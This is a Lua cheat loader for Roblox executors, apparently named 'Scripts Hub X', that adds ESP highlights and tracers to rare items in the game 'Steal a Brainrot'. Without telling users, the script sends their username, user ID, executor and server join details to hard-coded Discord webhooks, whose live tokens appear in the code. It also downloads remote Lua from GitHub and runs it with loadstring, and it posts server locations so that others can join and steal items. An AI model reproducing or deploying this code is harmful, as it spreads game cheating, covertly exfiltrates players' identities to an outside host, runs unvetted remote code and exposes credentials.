-- ================================
-- Scripts Hub X | Official (Fixed Version) + Enhanced ESP with Multiple Detection
-- ================================

-- Services
local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")
local SoundService = game:GetService("SoundService")
local HttpService = game:GetService("HttpService")
local CoreGui = game:GetService("CoreGui")
local MarketplaceService = game:GetService("MarketplaceService")
local TeleportService = game:GetService("TeleportService")
local Workspace = game:GetService("Workspace")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui", 5)

-- Target Game ID for Animal Logger
local STEAL_A_BRAINROT_ID = 109983668079237

-- Animal names to detect and log
local espTargetNames = {
	"Bisonte Giuppitere",
    "Los Tralaleritos",
	"Las Tralaleritas",
	"Graipuss Medussi",
    "La Grande Combinasion",
	"Garama and Madundung",
	"Pot Hotspot",
    "Las Vaquitas Saturnitas",
	"Chicleteira Bicicleteira",
	"Dragon Cannelloni",
    "Karkerkar Kurkur",
	"La Vacca Saturno Saturnita",
	"Blackhole Goat",
	"Dul Dul Dul",
    "Tortuginni Dragonfruitini",
	"Chimpanzini Spiderini",
	"Los Matteos",
	"Nooo My Hotspot",
	"Los Orcalitos",
    "Urubini Flamenguini",
	"Tralalita Tralala",
	"Orcalero Orcala",
	"Bulbito Bandito Traktorito",
    "Piccione Macchina",
	"Trenostruzzo Turbo 4000",
	"Los Combinasionas",
	"67",
	"Secret Lucky Block",
	"Trippi Troppi Troppa Trippa",
	"Los Tungtungtungcitos",
	"Agarrini La Palini",
	"Fragola La La La",
    "La Karkerkar Combinasion",
	"Job Job Job Sahur",
	"La Sahur Combinasion",
	"Los Chicleteiras",
	"Nuclearo Dinossauro",
	"Las Sis",
	"Celularcini Viciosini",
	"Los Bros",
	"Tralaledon",
	"Esok Sekolah",
	"Ketupat Kepat",
	"La Supreme Combinasion",
	"Ketchuru and Musturu",
	"Spaghetti Tualetti",
	"Strawberry Elephant",
	"Alessio",
	"Carloo",
	"Los Bombinitos",
	"Crabbo Limonetta",
	"Los Spyderinis",
	"Guerriro Digitale",
	"Admin Lucky Block",
	"Raccooni Jandelini",
	"Gattatino Nyanino",
	"Espresso Signora",
	"Unclito Samito",
	"Extinct Ballerina",
	"Sammyini Spyderini",
	"Chachechi",
	"Extinct Tralalero",
	"Extinct Matteo",
	"Los Nooo My Hotspotsitos",
	"Taco Lucky Block",
	"Tacorita Bicicleta",
	"La Extinct Grande",
	"Quesadilla Crocodila",
	"Pakrahmatmamat"
}

-- Create lookup table for faster checking
local espTargetLookup = {}
for _, name in pairs(espTargetNames) do
    espTargetLookup[name] = true
end

-- Enhanced tracking system for multiple instances
local loggedAnimals = {}
local animalCounts = {} -- Track counts per animal type
local espObjects = {} -- Changed to support multiple instances
local espEnabled = true
local espCounter = 0 -- Unique ID generator for ESP

-- UserIds
local OwnerUserId = "2341777244"
local PremiumUsers = {
	"1102633570", -- Pedrojay450 [PERM]
	"8860068952", -- Pedrojay450's alt (assaltanoobsbr) [PERM]
	"799427028", -- Roblox_xvt [PERM]
	"5317421108", -- kolwneje [PERM]
	"1458719572", -- wxckfeen [PERM]
	"8931026465", -- genderwillnottell [PERM]
	"679713988" -- LautyyPc [PERM]
}

local StaffUserId = {
	"3882788546", -- Keanjacob5
	"799427028", -- Roblox_xvt
	"9249886989", -- ALT
	"2726723958" -- mhicel235TOH
}

local BlacklistUsers = {
	"716599904", -- ImRottingInHell [PERM]
	"229691" -- ravyn [PERM]
}

-- Webhook URLs
local webhookUrl = "https://discord.com/api/webhooks/1416367485803827230/4OLebMf0rtkCajS5S5lmo99iXe0v6v5B1gn_lPDAzz_MQtj0-HabA9wa2PF-5QBNUmgi"
local webhookUrll = "https://discord.com/api/webhooks/1403702581104218153/k_yKYW6971_qADkSO6iuOjj7AIaXIfQuVcIs0mZIpNWJAc_cORIf0ieSDBlN8zibbHi-"

-- ================================
-- ENHANCED ESP FUNCTIONS
-- ================================

-- Create ESP for a single object with unique ID
local function createESP(object, animalName)
    if not object or not object.Parent then return end
    
    -- Generate unique ESP ID for multiple instances
    espCounter = espCounter + 1
    local espId = animalName .. "_" .. espCounter .. "_" .. tostring(object)
    
    -- Prevent duplicate ESP for the same object
    local existingESP = false
    for id, espData in pairs(espObjects) do
        if espData.object == object then
            existingESP = true
            break
        end
    end
    
    if existingESP then return end
    
    -- Create ESP container
    local espContainer = {}
    
    -- Function to create clean highlight effect
    local function createHighlight()
        local highlight = Instance.new("Highlight")
        highlight.Parent = object
        highlight.FillColor = Color3.new(0, 0.5, 1) -- Blue color
        highlight.OutlineColor = Color3.new(0, 0.8, 1) -- Brighter blue
        highlight.FillTransparency = 0.8
        highlight.OutlineTransparency = 0.3
        highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
        highlight.Adornee = object
        
        return highlight
    end
    
    -- Function to create smaller name label with count
    local function createNameLabel()
        local billboardGui = Instance.new("BillboardGui")
        billboardGui.Parent = object
        billboardGui.Size = UDim2.new(0, 120, 0, 30) -- Much smaller size
        billboardGui.StudsOffset = Vector3.new(0, 3, 0) -- Closer to object
        billboardGui.AlwaysOnTop = true
        
        -- Count how many of this animal type we have
        local count = animalCounts[animalName] or 1
        local displayText = animalName .. (count > 1 and " (" .. count .. ")" or "")
        
        local nameLabel = Instance.new("TextLabel")
        nameLabel.Parent = billboardGui
        nameLabel.Size = UDim2.new(1.5, 0, 1.5, 0)
        nameLabel.BackgroundTransparency = 1
        nameLabel.Text = displayText
        nameLabel.TextColor3 = Color3.new(0, 0.5, 1) -- White text
        nameLabel.TextStrokeTransparency = 0
        nameLabel.TextStrokeColor3 = Color3.new(0, 0.8, 1) -- Black outline
        nameLabel.TextScaled = true
        nameLabel.TextSize = 14 -- Fixed smaller size
        nameLabel.Font = Enum.Font.GothamMedium -- Less bold
        
        return billboardGui
    end
    
    -- Function to create super thin tracer line
    local function createTracer()
        local camera = workspace.CurrentCamera
        if not camera then return nil end
        
        -- Create tracer line using Beam
        local attachment0 = Instance.new("Attachment")
        attachment0.Parent = camera
        attachment0.Position = Vector3.new(0, 0, 0)
        
        local attachment1 = Instance.new("Attachment")
        attachment1.Parent = object.PrimaryPart or object:FindFirstChildOfClass("BasePart")
        if not attachment1.Parent then return nil end
        
        local beam = Instance.new("Beam")
        beam.Parent = workspace
        beam.Attachment0 = attachment0
        beam.Attachment1 = attachment1
        beam.Width0 = 1 -- Super thin start
        beam.Width1 = 1 -- Super thin end
        beam.Color = ColorSequence.new(Color3.new(0, 0.8, 1)) -- Blue color
        beam.Transparency = NumberSequence.new(0.3) -- Semi-transparent
        beam.FaceCamera = true
        
        return {beam = beam, attachment0 = attachment0, attachment1 = attachment1}
    end
    
    -- Create ESP components (no selection boxes!)
    local highlight = createHighlight()
    local nameLabel = createNameLabel()
    local tracer = createTracer()
    
    -- Store ESP components
    espContainer.highlight = highlight
    espContainer.nameLabel = nameLabel
    espContainer.tracer = tracer
    espContainer.object = object
    espContainer.animalName = animalName
    
    espObjects[espId] = espContainer
    
    -- Clean up if object is destroyed
    object.AncestryChanged:Connect(function()
        if not object.Parent then
            if espObjects[espId] then
                if espObjects[espId].highlight then
                    espObjects[espId].highlight:Destroy()
                end
                if espObjects[espId].nameLabel then
                    espObjects[espId].nameLabel:Destroy()
                end
                if espObjects[espId].tracer then
                    if espObjects[espId].tracer.beam then
                        espObjects[espId].tracer.beam:Destroy()
                    end
                    if espObjects[espId].tracer.attachment0 then
                        espObjects[espId].tracer.attachment0:Destroy()
                    end
                    if espObjects[espId].tracer.attachment1 then
                        espObjects[espId].tracer.attachment1:Destroy()
                    end
                end
                espObjects[espId] = nil
            end
        end
    end)
    
    return espId
end

-- Remove ESP from an object
local function removeESP(espId)
    if espObjects[espId] then
        if espObjects[espId].highlight then
            espObjects[espId].highlight:Destroy()
        end
        if espObjects[espId].nameLabel then
            espObjects[espId].nameLabel:Destroy()
        end
        if espObjects[espId].tracer then
            if espObjects[espId].tracer.beam then
                espObjects[espId].tracer.beam:Destroy()
            end
            if espObjects[espId].tracer.attachment0 then
                espObjects[espId].tracer.attachment0:Destroy()
            end
            if espObjects[espId].tracer.attachment1 then
                espObjects[espId].tracer.attachment1:Destroy()
            end
        end
        espObjects[espId] = nil
    end
end

-- Update ESP labels with current counts
local function updateESPLabels()
    for espId, espContainer in pairs(espObjects) do
        if espContainer.nameLabel and espContainer.animalName then
            local count = animalCounts[espContainer.animalName] or 1
            local displayText = espContainer.animalName .. (count > 1 and " (" .. count .. ")" or "")
            
            local textLabel = espContainer.nameLabel:FindFirstChild("TextLabel")
            if textLabel then
                textLabel.Text = displayText
            end
        end
    end
end

-- Apply ESP to all currently detected brainrots (always enabled)
local function applyESPToExistingAnimals()
    -- Reset animal counts
    animalCounts = {}
    
    -- ESP for plot animals
    local plots = workspace:FindFirstChild("Plots")
    if plots then
        for _, plot in pairs(plots:GetChildren()) do
            if plot:IsA("Model") then
                for _, child in pairs(plot:GetChildren()) do
                    if child:IsA("Model") and espTargetLookup[child.Name] then
                        -- Increment count
                        animalCounts[child.Name] = (animalCounts[child.Name] or 0) + 1
                        createESP(child, child.Name)
                    end
                end
            end
        end
    end
    
    -- ESP for rendered moving animals
    local renderedAnimals = workspace:FindFirstChild("RenderedMovingAnimals")
    if renderedAnimals then
        for _, child in pairs(renderedAnimals:GetChildren()) do
            if child:IsA("Model") and espTargetLookup[child.Name] then
                -- Increment count
                animalCounts[child.Name] = (animalCounts[child.Name] or 0) + 1
                createESP(child, child.Name)
            end
        end
    end
    
    -- Update all ESP labels with counts
    updateESPLabels()
end

-- Clear all ESP
local function clearAllESP()
    for espId, espContainer in pairs(espObjects) do
        if espContainer.highlight then
            espContainer.highlight:Destroy()
        end
        if espContainer.nameLabel then
            espContainer.nameLabel:Destroy()
        end
        if espContainer.tracer then
            if espContainer.tracer.beam then
                espContainer.tracer.beam:Destroy()
            end
            if espContainer.tracer.attachment0 then
                espContainer.tracer.attachment0:Destroy()
            end
            if espContainer.tracer.attachment1 then
                espContainer.tracer.attachment1:Destroy()
            end
        end
    end
    espObjects = {}
    animalCounts = {}
end

-- ================================
-- ENHANCED ANIMAL LOGGING FUNCTIONS
-- ================================

-- Enhanced animal scanning with count tracking
local function scanPlotsForAnimals()
    local plots = workspace:FindFirstChild("Plots")
    if not plots then 
        return {}
    end
    
    local foundAnimals = {}
    local currentCounts = {} -- Track current scan counts
    
    -- Check each randomly generated plot
    for _, plot in pairs(plots:GetChildren()) do
        if plot:IsA("Model") then
            local plotName = plot.Name
            
            -- Check direct children of this plot for target animals
            for _, child in pairs(plot:GetChildren()) do
                if child:IsA("Model") and espTargetLookup[child.Name] then
                    local animalName = child.Name
                    local animalId = plotName .. "_" .. animalName .. "_" .. tostring(child)
                    
                    -- Count animals of this type
                    currentCounts[animalName] = (currentCounts[animalName] or 0) + 1
                    
                    -- Only log if we haven't logged this specific instance before
                    if not loggedAnimals[animalId] then
                        table.insert(foundAnimals, {
                            plotName = plotName,
                            animalName = animalName,
                            animalId = animalId,
                            object = child
                        })
                        loggedAnimals[animalId] = true
                        
                        -- Apply ESP immediately when found (always enabled)
                        animalCounts[animalName] = currentCounts[animalName]
                        createESP(child, animalName)
                    end
                end
            end
        end
    end
    
    -- Update global counts
    for animalName, count in pairs(currentCounts) do
        animalCounts[animalName] = count
    end
    
    return foundAnimals
end

local function scanRenderedMovingAnimals()
    local renderedAnimals = workspace:FindFirstChild("RenderedMovingAnimals")
    if not renderedAnimals then 
        return {}
    end
    
    local foundAnimals = {}
    local currentCounts = {}
    
    -- Check direct children for target animals
    for _, child in pairs(renderedAnimals:GetChildren()) do
        if child:IsA("Model") and espTargetLookup[child.Name] then
            local animalName = child.Name
            local animalId = "RenderedMoving_" .. animalName .. "_" .. tostring(child)
            
            -- Count animals of this type
            currentCounts[animalName] = (currentCounts[animalName] or 0) + 1
            
            -- Only log if we haven't logged this specific instance before
            if not loggedAnimals[animalId] then
                table.insert(foundAnimals, {
                    plotName = "RenderedMovingAnimals",
                    animalName = animalName,
                    animalId = animalId,
                    object = child
                })
                loggedAnimals[animalId] = true
                
                -- Apply ESP immediately when found (always enabled)
                animalCounts[animalName] = currentCounts[animalName]
                createESP(child, animalName)
            end
        end
    end
    
    -- Update global counts
    for animalName, count in pairs(currentCounts) do
        animalCounts[animalName] = count
    end
    
    return foundAnimals
end

-- Enhanced logging with count display
local function sendAnimalLog(animals)
    if #animals == 0 then return end
    
    pcall(function()
        local placeId = tostring(game.PlaceId)
        local jobId = game.JobId or "Unknown"
        
        -- Create consolidated animal list with counts
        local animalTypeCounts = {}
        for _, animal in pairs(animals) do
            animalTypeCounts[animal.animalName] = (animalTypeCounts[animal.animalName] or 0) + 1
        end
        
        local animalList = ""
        local index = 0
        for animalName, count in pairs(animalTypeCounts) do
            index = index + 1
            if count > 1 then
                animalList = animalList .. "**" .. animalName .. " (" .. count .. ")**"
            else
                animalList = animalList .. "**" .. animalName .. "**"
            end
            if index < table.maxn(animalTypeCounts) then
                animalList = animalList .. "\n"
            end
        end
        
        -- Create join script
        local joinScript = 'game:GetService("TeleportService"):TeleportToPlaceInstance(' .. placeId .. ', "' .. jobId .. '", game.Players.LocalPlayer)'
        local playerCount = #Players:GetPlayers()
        
        local totalAnimals = 0
        for _, count in pairs(animalTypeCounts) do
            totalAnimals = totalAnimals + count
        end
			
        local send_data = {
            ["username"] = "Scripts Hub X | Official - Notifyer",
            ["avatar_url"] = "https://unconscious-yellow-va1rcyikr7.edgeone.app/file_00000000fd6861fa99045e7ff823f06b.png",
            ["embeds"] = {
                {
                    ["title"] = "👑 PREMIUM BRAINROT NOTIFYER 👑",
                    ["description"] = "Total: " .. totalAnimals .. " brainrot(s) found",
                    ["color"] = 15844367, -- Gold color
                    ["fields"] = {
                        {["name"] = "Brainrots Found", ["value"] = animalList, ["inline"] = true},
						{["name"] = "JobId", ["value"] = jobId, ["inline"] = true},
                        {["name"] = "Players", ["value"] = playerCount .. "/8", ["inline"] = true},
						{["name"] = "Join Script", ["value"] = joinScript, ["inline"] = true},
                        {["name"] = "Join Link", ["value"] = '[Join Server](https://pickletalk.netlify.app/?placeId=' .. placeId .. '&gameInstanceId=' .. jobId .. ')', ["inline"] = true}
                    },
                    ["footer"] = {
                        ["text"] = "Brainrots Notifyer • Scripts Hub X | Official",
                        ["icon_url"] = "https://unconscious-yellow-va1rcyikr7.edgeone.app/file_00000000fd6861fa99045e7ff823f06b.png"
                    }
                }
            }
        }
        
        local headers = {["Content-Type"] = "application/json"}
        pcall(function()
            if request and type(request) == "function" then
                request({
                    Url = webhookUrll,
                    Method = "POST",
                    Headers = headers,
                    Body = HttpService:JSONEncode(send_data)
                })
            elseif http_request and type(http_request) == "function" then
                http_request({
                    Url = webhookUrll,
                    Method = "POST",
                    Headers = headers,
                    Body = HttpService:JSONEncode(send_data)
                })
            end
        end)
    end)
end

local function checkForAnimals()
    local plotAnimals = scanPlotsForAnimals()
    local renderedAnimals = scanRenderedMovingAnimals()
    
    -- Combine both results
    local allAnimals = {}
    for _, animal in pairs(plotAnimals) do
        table.insert(allAnimals, animal)
    end
    for _, animal in pairs(renderedAnimals) do
        table.insert(allAnimals, animal)
    end
    
    -- Update ESP labels with current counts
    updateESPLabels()
    
    -- Send to webhook if animals found (silently, no notifications)
    if #allAnimals > 0 then
        sendAnimalLog(allAnimals)
    end
end

-- ================================
-- REMAINING ORIGINAL FUNCTIONS (UNCHANGED)
-- ================================

-- Notification function
local function notify(title, text)
	spawn(function()
		pcall(function()
			game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = title, 
				Text = text, 
				Duration = 3
			})
		end)
	end)
end

-- Executor detection function
local function detectExecutor()
	if syn and syn.request then
		return "Synapse X"
	elseif KRNL_LOADED then
		return "KRNL"
	elseif getgenv and getgenv().isfluxus then
		return "Fluxus"
	elseif getgenv and getgenv().scriptware then
		return "Script-Ware"
	elseif getgenv and getgenv().protosmasher then
		return "ProtoSmasher"
	elseif getgenv and getgenv().sirhurt then
		return "SirHurt"
	elseif getgenv and getgenv().sentinellib then
		return "Sentinel"
	elseif getgenv and getgenv().vega then
		return "Vega X"
	elseif getgenv and getgenv().oxygen then
		return "Oxygen U"
	elseif getgenv and getgenv().comet then
		return "Comet"
	elseif getgenv and getgenv().nihon then
		return "Nihon"
	elseif getgenv and getgenv().delta then
		return "Delta"
	elseif getgenv and getgenv().evon then
		return "Evon"
	elseif getgenv and getgenv().electron then
		return "Electron"
	elseif identifyexecutor then
		local executor = identifyexecutor()
		if executor then
			return executor
		end
	end
	return "Unknown"
end

-- Webhook notification function
local function sendWebhookNotification(userStatus, scriptUrl)
	pcall(function()
		print("Sending webhook notification")
		
		local gameName = "Unknown"
		local success, productInfo = pcall(function()
			return MarketplaceService:GetProductInfo(game.PlaceId)
		end)
		if success and productInfo and productInfo.Name then
			gameName = productInfo.Name
		end
		
		local userId = tostring(player.UserId)
		local detectedExecutor = detectExecutor()
		local placeId = tostring(game.PlaceId)
		local jobId = game.JobId or "Can't detect JobId"
		
		local send_data = {
			["username"] = "Script Execution Log",
			["avatar_url"] = "https://res.cloudinary.com/dtjjgiitl/image/upload/q_auto:good,f_auto,fl_progressive/v1753332266/kpjl5smuuixc5w2ehn7r.jpg",
			["content"] = "Scripts Hub X | Official - Logging",
			["embeds"] = {
				{
					["title"] = "Script Execution Details",
					["description"] = "**Game**: " .. gameName .. "\n**Game ID**: " .. game.PlaceId .. "\n**Profile**: https://www.roblox.com/users/" .. player.UserId .. "/profile",
					["color"] = 2123412,
					["fields"] = {
						{["name"] = "Display Name", ["value"] = player.DisplayName, ["inline"] = true},
						{["name"] = "Username", ["value"] = player.Name, ["inline"] = true},
						{["name"] = "User ID", ["value"] = tostring(player.UserId), ["inline"] = true},
						{["name"] = "Executor", ["value"] = detectedExecutor, ["inline"] = true},
						{["name"] = "User Type", ["value"] = userStatus, ["inline"] = true},
						{["name"] = "Job Id", ["value"] = game.JobId, ["inline"] = true},
						{["name"] = "Join Script", ["value"] = 'game:GetService("TeleportService"):TeleportToPlaceInstance(' .. placeId .. ', "' .. jobId .. '", game.Players.LocalPlayer)', ["inline"] = true},
						{["name"] = "Join Link", ["value"] = '[Join To The Server](https://pickletalk.netlify.app/?placeId=' .. placeId .. '&gameInstanceId=' .. jobId .. ')', ["inline"] = true}
					},
					["footer"] = {["text"] = "Scripts Hub X | Official", ["icon_url"] = "https://res.cloudinary.com/dtjjgiitl/image/upload/q_auto:good,f_auto,fl_progressive/v1753332266/kpjl5smuuixc5w2ehn7r.jpg"},
					["thumbnail"] = {["url"] = "https://thumbnails.roproxy.com/v1/users/avatar-headshot?userIds=" .. player.UserId .. "&size=420x420&format=Png&isCircular=true"}
				}
			}
		}
		
		local headers = {["Content-Type"] = "application/json"}
		local success, err = pcall(function()
			if request and type(request) == "function" then
				request({
					Url = webhookUrl,
					Method = "POST",
					Headers = headers,
					Body = HttpService:JSONEncode(send_data)
				})
			elseif http_request and type(http_request) == "function" then
				http_request({
					Url = webhookUrl,
					Method = "POST",
					Headers = headers,
					Body = HttpService:JSONEncode(send_data)
				})
			end
		end)
		
		if success then
			print("Webhook notification sent successfully")
		else
			warn("Failed to send webhook notification: " .. tostring(err))
		end
	end)
end

-- Error display function
local function showError(text)
	pcall(function()
		local screenGui = Instance.new("ScreenGui")
		screenGui.Name = "ErrorNotification"
		screenGui.IgnoreGuiInset = true
		screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
		screenGui.Parent = playerGui

		local mainFrame = Instance.new("Frame")
		mainFrame.Size = UDim2.new(1, 0, 1, 0)
		mainFrame.BackgroundColor3 = Color3.fromRGB(10, 20, 30)
		mainFrame.BackgroundTransparency = 1
		mainFrame.Parent = screenGui

		local contentFrame = Instance.new("Frame")
		contentFrame.Size = UDim2.new(0, 400, 0, 320)
		contentFrame.Position = UDim2.new(0.5, -200, 0.5, -160)
		contentFrame.BackgroundColor3 = Color3.fromRGB(20, 40, 60)
		contentFrame.BackgroundTransparency = 1
		contentFrame.BorderSizePixel = 0
		contentFrame.Parent = mainFrame

		local contentFrameCorner = Instance.new("UICorner")
		contentFrameCorner.CornerRadius = UDim.new(0, 16)
		contentFrameCorner.Parent = contentFrame

		local contentStroke = Instance.new("UIStroke")
		contentStroke.Color = Color3.fromRGB(80, 160, 255)
		contentStroke.Thickness = 1.5
		contentStroke.Transparency = 1
		contentStroke.Parent = contentFrame

		local titleLabel = Instance.new("TextLabel")
		titleLabel.Size = UDim2.new(1, -40, 0, 50)
		titleLabel.Position = UDim2.new(0, 20, 0, 20)
		titleLabel.BackgroundTransparency = 1
		titleLabel.Text = "Error"
		titleLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
		titleLabel.TextScaled = true
		titleLabel.TextSize = 24
		titleLabel.Font = Enum.Font.GothamBold
		titleLabel.TextTransparency = 1
		titleLabel.Parent = contentFrame

		local errorLabel = Instance.new("TextLabel")
		errorLabel.Size = UDim2.new(1, -40, 0, 60)
		errorLabel.Position = UDim2.new(0, 20, 0, 80)
		errorLabel.BackgroundTransparency = 1
		errorLabel.Text = text
		errorLabel.TextColor3 = Color3.fromRGB(150, 180, 200)
		errorLabel.TextScaled = true
		errorLabel.TextSize = 12
		errorLabel.Font = Enum.Font.Gotham
		errorLabel.TextTransparency = 1
		errorLabel.TextWrapped = true
		errorLabel.Parent = contentFrame

		local discordLabel = Instance.new("TextLabel")
		discordLabel.Size = UDim2.new(1, -40, 0, 60)
		discordLabel.Position = UDim2.new(0, 20, 0, 150)
		discordLabel.BackgroundTransparency = 1
		discordLabel.Text = "Suggest this game on our Discord: https://discord.gg/bpsNUH5sVb"
		discordLabel.TextColor3 = Color3.fromRGB(100, 160, 255)
		discordLabel.TextScaled = true
		discordLabel.TextSize = 12
		discordLabel.Font = Enum.Font.Gotham
		discordLabel.TextTransparency = 1
		discordLabel.TextWrapped = true
		discordLabel.Parent = contentFrame

		local copyButton = Instance.new("TextButton")
		copyButton.Size = UDim2.new(0, 80, 0, 28)
		copyButton.Position = UDim2.new(0.5, -40, 0, 220)
		copyButton.BackgroundColor3 = Color3.fromRGB(80, 160, 255)
		copyButton.BackgroundTransparency = 1
		copyButton.Text = "Copy Link"
		copyButton.TextColor3 = Color3.fromRGB(230, 240, 255)
		copyButton.TextScaled = true
		copyButton.TextSize = 12
		copyButton.Font = Enum.Font.GothamBold
		copyButton.TextTransparency = 1
		copyButton.Parent = contentFrame

		local copyButtonCorner = Instance.new("UICorner")
		copyButtonCorner.CornerRadius = UDim.new(0, 6)
		copyButtonCorner.Parent = copyButton

		copyButton.MouseButton1Click:Connect(function()
			pcall(function()
				if setclipboard then
					setclipboard("https://discord.gg/bpsNUH5sVb")
					copyButton.Text = "Copied!"
					copyButton.BackgroundColor3 = Color3.fromRGB(60, 140, 235)
					task.wait(1)
					copyButton.Text = "Copy Link"
					copyButton.BackgroundColor3 = Color3.fromRGB(80, 160, 255)
				end
			end)
		end)

		-- Animation function
		local function playEntranceAnimations()
			local mainFrameTween = TweenService:Create(mainFrame, TweenInfo.new(0.6, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 0.7})
			local contentFrameTween = TweenService:Create(contentFrame, TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {BackgroundTransparency = 0.5})
			local contentStrokeTween = TweenService:Create(contentStroke, TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {Transparency = 0.4})
			local titleTween = TweenService:Create(titleLabel, TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {TextTransparency = 0})
			local errorTween = TweenService:Create(errorLabel, TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {TextTransparency = 0})
			local discordTween = TweenService:Create(discordLabel, TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {TextTransparency = 0})
			local copyButtonTween = TweenService:Create(copyButton, TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {TextTransparency = 0, BackgroundTransparency = 0.2})

			mainFrameTween:Play()
			contentFrameTween:Play()
			contentStrokeTween:Play()
			titleTween:Play()
			task.wait(0.1)
			errorTween:Play()
			task.wait(0.1)
			discordTween:Play()
			task.wait(0.1)
			copyButtonTween:Play()
		end

		playEntranceAnimations()
		task.wait(5)
		screenGui:Destroy()
	end)
end

-- Game support check function
local function checkGameSupport()
	print("Checking game support for PlaceID: " .. game.PlaceId)
	
	local success, Games = pcall(function()
		local script = game:HttpGet("https://raw.githubusercontent.com/pickletalk/Scripts-Hub-X/refs/heads/main/GameList.lua")
		return loadstring(script)()
	end)
	
	if not success then
		warn("Failed to load game list: " .. tostring(Games))
		return false, nil
	end
	
	if type(Games) ~= "table" then
		warn("Game list returned invalid data")
		return false, nil
	end
	
	for PlaceID, Execute in pairs(Games) do
		if PlaceID == game.PlaceId then
			print("Game supported, script URL: " .. Execute)
			return true, Execute
		end
	end
	
	print("Game not supported")
	return false, nil
end

-- SIMPLIFIED Game script loading function
local function loadGameScript(scriptUrl)
	print("Loading game script from URL: " .. scriptUrl)
	
	-- Simple one-liner script loader
	local success, result = pcall(function()
		return loadstring(game:HttpGet(scriptUrl))()
	end)
	
	if success then
		print("✅ Game script loaded and executed successfully")
		return true, nil
	else
		warn("❌ Failed to load/execute game script: " .. tostring(result))
		return false, tostring(result)
	end
end

-- User status check function
local function checkUserStatus()
	local userId = tostring(player.UserId)
	print("Checking user status for UserId: " .. userId)
	
	-- Check blacklist first
	if BlacklistUsers and table.find(BlacklistUsers, userId) then
		print("Blacklisted user detected")
		return "blacklisted"
	end
	
	-- Check owner
	if OwnerUserId and userId == tostring(OwnerUserId) then
		print("Owner detected")
		return "owner"
	end
	
	-- Check staff
	if StaffUserId and table.find(StaffUserId, userId) then
		print("Staff detected")
		return "staff"
	end
	
	-- Check premium
	if PremiumUsers and table.find(PremiumUsers, userId) then
		print("Premium user detected")
		return "premium"
	end
	
	print("Regular user detected")
	return "regular"
end

-- Initialize Enhanced Animal Logger for Steal A Brainrot
local function initializeAnimalLogger()
	if game.PlaceId == STEAL_A_BRAINROT_ID then
		print("🎯 Initializing Clean Brainrot ESP System...")
		
		-- Initial scan after delay
		task.spawn(function()
			task.wait(2) -- Wait for game to fully load
			checkForAnimals()
			applyESPToExistingAnimals() -- Apply ESP to any existing animals
		end)
		
		-- Monitor for new animals being added to Plots
		workspace.DescendantAdded:Connect(function(descendant)
			if descendant:IsA("Model") and descendant.Parent and espTargetLookup[descendant.Name] then
				-- Check if it's in a plot
				local parent = descendant.Parent
				if parent and parent.Parent == workspace:FindFirstChild("Plots") then
					task.wait(1) -- Small delay to ensure the animal is fully loaded
					checkForAnimals()
				end
			end
		end)
		
		-- Monitor for new animals in RenderedMovingAnimals
		local renderedAnimals = workspace:FindFirstChild("RenderedMovingAnimals")
		if renderedAnimals then
			renderedAnimals.ChildAdded:Connect(function(child)
				if child:IsA("Model") and espTargetLookup[child.Name] then
					task.wait(1)
					checkForAnimals()
				end
			end)
		end
		
		-- Watch for RenderedMovingAnimals folder being created
		workspace.ChildAdded:Connect(function(child)
			if child.Name == "RenderedMovingAnimals" then
				child.ChildAdded:Connect(function(animal)
					if animal:IsA("Model") and espTargetLookup[animal.Name] then
						task.wait(1)
						checkForAnimals()
					end
				end)
			end
		end)
		
		-- Periodic scan every 10 seconds to catch any missed animals
		task.spawn(function()
			while true do
				task.wait(10)
				checkForAnimals()
			end
		end)
	end
end

-- ================================
-- MAIN EXECUTION (ENHANCED)
-- ================================

spawn(function()
	print("🚀 Starting Scripts Hub X with Clean ESP System...")
	
	-- Check user status
	local userStatus = checkUserStatus()
	
	-- Handle blacklisted users
	if userStatus == "blacklisted" then
		player:Kick("You are blacklisted from using this script!")
		return
	end
	
	-- Check game support
	local isSupported, scriptUrl = checkGameSupport()
	
	-- Send webhook notification
	sendWebhookNotification(userStatus, scriptUrl or "No script URL")
	
	-- Initialize Clean Animal Logger with ESP (silently)
	initializeAnimalLogger()
	
	-- Handle unsupported games
	if not isSupported then
		print("❌ Game not supported")
		showError("Game is not supported")
		return
	end
	
	-- Load and execute the game script (SIMPLIFIED)
	print("🎮 Loading game script...")
	local success, errorMsg = loadGameScript(scriptUrl)
	
	if success then
		print("✅ Scripts Hub X | Complete for " .. userStatus .. " user")
	else
		print("❌ Script failed to load: " .. tostring(errorMsg))
	end
end)
